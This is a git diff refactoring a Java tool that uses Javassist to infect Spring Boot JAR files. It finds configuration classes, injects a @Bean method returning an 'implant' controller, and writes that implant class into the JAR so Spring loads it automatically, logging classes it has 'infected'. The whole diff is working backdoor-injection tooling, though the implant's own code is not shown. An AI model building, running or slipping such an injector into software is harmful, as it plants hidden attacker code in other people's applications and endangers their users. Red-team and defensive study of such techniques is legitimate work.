@@ -2,6 +2,7 @@ package org.example.injector;
 
 import javassist.bytecode.*;
 import javassist.bytecode.annotation.Annotation;
+import javassist.bytecode.annotation.MemberValue;
 import org.example.implants.SpringImplantConfiguration;
 import org.example.implants.SpringImplantController;
 
@@ -60,42 +61,42 @@ public class SpringInjector {
                     continue;
                 }
 
-                ClassFile classFile;
+                ClassFile currentlyProcessingClassFile;
                 try (DataInputStream in = new DataInputStream(entry.getContent())) {
-                    classFile = new ClassFile(in);
-                    if (!isSpringContext(classFile)) {
+                    currentlyProcessingClassFile = new ClassFile(in);
+                    if (!isSpringConfigurationClass(currentlyProcessingClassFile)) {
                         entry.passOn();
                         continue;
                     }
                     System.out.println("[+] Found Spring configuration: " + entry.getName());
 
-                    if (!hasComponentScanEnabled(classFile)) {
-                        System.out.println("[-] Spring configuration is not set to scan for components (@ComponentScan).");
-                        try {
-                            ClassFile implantSpringConfig = ImplantReader.findAndReadClassFile(SpringImplantConfiguration.class);
-                            if (!addSpringBean(classFile, implantSpringConfig)) {
-                                throw new RuntimeException("Failed.");  // TODO Do better error handling
-                            }
-                        } catch (ClassNotFoundException e) {
-                            throw new RuntimeException(e);
+                    if (!hasComponentScanEnabled(currentlyProcessingClassFile)) {
+                        System.out.println("[-] Spring configuration is not set to automatically scan for components (@ComponentScan).");
+
+                        ClassFile implantSpringConfig = loadSpringImplantConfigClass();
+                        if (!addSpringBeanToConfigClass(currentlyProcessingClassFile, implantSpringConfig)) {
+                            System.out.println("[-] Class '" + currentlyProcessingClassFile.getName() + "' already infected. Skipping.");
+                            continue;
                         }
 
-                        classFile.write(entry.addOnly());
-                        System.out.println("[+] Injected @Bean method into '" + classFile.getName() + "'.");
+                        currentlyProcessingClassFile.write(entry.addOnly());
+                        System.out.println("[+] Injected @Bean method into '" + currentlyProcessingClassFile.getName() + "'.");
                     } else {
                         entry.passOn();
                     }
 
-                    // Just add a new class into the JAR
-                    String targetPackageName = parsePackageNameFromFqcn(classFile.getName());
-                    System.out.println("[+] Found package name: " + targetPackageName);
+                    /*
+                     * By adding our own Spring component (like a RestController) into the JAR under the same package
+                     * as the Spring config class, Spring will happily load it automatically. This is assuming that
+                     * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
+                     * component needs to be explicitly referenced as a @Bean in the config class.
+                     */
                     ClassFile implantClass = loadImplantClass();
-                    String implantClassName = parseClassNameFromFqcn(implantClass.getName());
-                    implantClass.setName(targetPackageName + "." + implantClassName);
-                    String fullPathInsideJar = "BOOT-INF/classes/" + implantClass.getName().replace(".", "/") + ".class";
-                    JarEntry newJarEntry = new JarEntry(fullPathInsideJar);
+                    String targetPackageName = parsePackageNameFromFqcn(currentlyProcessingClassFile.getName());
+                    JarEntry newJarEntry = convertToJarEntry(implantClass, targetPackageName);
                     implantClass.write(fiddler.addNewEntry(newJarEntry));
                     System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
+
                     didInfect = true;
                 }
             }
@@ -125,7 +126,7 @@ public class SpringInjector {
         return parts[parts.length - 1];
     }
 
-    private ClassFile loadImplantClass() throws IOException {
+    private static ClassFile loadImplantClass() throws IOException {
         try {
             // TODO Add class translation hashmap thing as param here
             return ImplantReader.findAndReadClassFile(SpringImplantController.class);
@@ -134,39 +135,48 @@ public class SpringInjector {
         }
     }
 
-    private boolean addSpringBean(ClassFile existingSpringConfigClass, final ClassFile implantSpringConfig) {
-        MethodInfo existingImplantControllerBean = existingSpringConfigClass.getMethod("getImplantController");    // TODO Don't hardcode this
+    private static ClassFile loadSpringImplantConfigClass() {
+        try {
+            return ImplantReader.findAndReadClassFile(SpringImplantConfiguration.class);
+        } catch (ClassNotFoundException | IOException e) {
+            throw new RuntimeException("Cannot load SpringImplantConfiguration class.", e);
+        }
+    }
+
+    private static boolean addSpringBeanToConfigClass(ClassFile existingSpringConfig, final ClassFile implantSpringConfig) {
+        final String beanMethodName = "getImplantController";
+        MethodInfo existingImplantControllerBean = existingSpringConfig.getMethod(beanMethodName);
         if (existingImplantControllerBean != null) {
-            System.out.println("[-] Class '" + existingSpringConfigClass.getName() + "' already infected. Skipping.");
             return false;
         }
 
         try {
-            String targetPackageName = parsePackageNameFromFqcn(existingSpringConfigClass.getName());
-            String implantPackageName = parsePackageNameFromFqcn(implantSpringConfig.getName());
-            String targetPackageDesc = targetPackageName.replace(".", "/");
-            String implantPackageDesc = implantPackageName.replace(".", "/");
-
-            // More or less code duplication from MethodInjector.infectTarget() - consider refactoring
-            MethodInfo implantBeanMethod = implantSpringConfig.getMethod("getImplantController");  // Same as above
-            String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
-            MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfigClass.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
-            //targetBeanMethod.setExceptionsAttribute(implantBeanMethod.getExceptionsAttribute());
+            String targetPackageDesc = parsePackageNameFromFqcn(existingSpringConfig.getName()).replace(".", "/");
+            String implantPackageDesc = parsePackageNameFromFqcn(implantSpringConfig.getName()).replace(".", "/");
+            String targetNameDesc = parseClassNameFromFqcn(existingSpringConfig.getName());
+            String implantNameDesc = parseClassNameFromFqcn(implantSpringConfig.getName());
+            // TODO Make a convertToClassFormatFqcn() to go from dot-notation to slash-notation
 
             Map<String, String> translateTable = new HashMap<>();
             // TODO Don't hardcode
-            translateTable.put("org/example/implants/SpringImplantController", "com/example/restservice/SpringImplantController");
-            translateTable.put("org/example/implants/SpringImplantConfiguration", "com/example/restservice/RestServiceApplication");
-            CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfigClass.getConstPool(), translateTable);
-            codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals()); // Will this do the trick or is some fixed value necessary?
-            targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Same weird workaround
+            translateTable.put(implantPackageDesc + "/SpringImplantController", targetPackageDesc + "/SpringImplantController");
+            translateTable.put(implantPackageDesc + "/" + implantNameDesc, targetPackageDesc + "/" + targetNameDesc);
+
+            MethodInfo implantBeanMethod = implantSpringConfig.getMethod(beanMethodName);
+            String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
+            MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
+            targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist
+
+            CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
+            codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
             targetBeanMethod.setCodeAttribute(codeAttr);
 
-            AnnotationsAttribute runtimeVisibleAnnotations = new AnnotationsAttribute(targetBeanMethod.getConstPool(), "RuntimeVisibleAnnotations");
-            runtimeVisibleAnnotations.addAnnotation(new Annotation("org.springframework.context.annotation.Bean", implantSpringConfig.getConstPool()));
-            targetBeanMethod.getAttributes().add(runtimeVisibleAnnotations);
+            ExceptionsAttribute exceptions = (ExceptionsAttribute) implantBeanMethod.getExceptionsAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
+            targetBeanMethod.setExceptionsAttribute(exceptions);
 
-            existingSpringConfigClass.addMethod(targetBeanMethod);
+            copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);
+
+            existingSpringConfig.addMethod(targetBeanMethod);
         } catch (DuplicateMemberException e) {
             throw new RuntimeException(e);
         }
@@ -174,7 +184,39 @@ public class SpringInjector {
         return true;
     }
 
-    private static boolean isSpringContext(final ClassFile classFile) {
+    // Copy all annotations from implant method to target method. Notice the const pools!
+    private static void copyAllMethodAnnotations(MethodInfo target, final MethodInfo source) {
+        AttributeInfo sourceAttr = source.getAttribute("RuntimeVisibleAnnotations");
+        if (sourceAttr == null) {
+            // The source method does not have any annotations. Is this fine?
+            return;
+        }
+        if (!(sourceAttr instanceof AnnotationsAttribute sourceAnnotationsAttr)) {
+            throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
+        }
+
+        AnnotationsAttribute targetAnnotationsAttr = new AnnotationsAttribute(target.getConstPool(), "RuntimeVisibleAnnotations");
+        for (Annotation annotation : sourceAnnotationsAttr.getAnnotations()) {
+            Annotation copiedAnnotation = new Annotation(annotation.getTypeName(), target.getConstPool());
+            for (String memberValueName : annotation.getMemberNames()) {
+                MemberValue memberValue = annotation.getMemberValue(memberValueName);
+                copiedAnnotation.addMemberValue(memberValueName, memberValue);
+            }
+            targetAnnotationsAttr.addAnnotation(copiedAnnotation);
+        }
+
+        target.addAttribute(targetAnnotationsAttr);
+    }
+
+    private static JarEntry convertToJarEntry(final ClassFile classFile, final String targetPackageName) {
+        String implantClassName = parseClassNameFromFqcn(classFile.getName());
+        classFile.setName(targetPackageName + "." + implantClassName);
+        // TODO Maybe this "BOOT-INF" etc is not a good thing to hardcode? Versioned JARs? Discrepancies in Spring JAR structure?
+        String fullPathInsideJar = "BOOT-INF/classes/" + classFile.getName().replace(".", "/") + ".class";
+        return new JarEntry(fullPathInsideJar);
+    }
+
+    private static boolean isSpringConfigurationClass(final ClassFile classFile) {
         List<Annotation> springAnnotations = classFile.getAttributes().stream()
                 .filter(attribute -> attribute instanceof AnnotationsAttribute)
                 .map(attribute -> (AnnotationsAttribute) attribute)
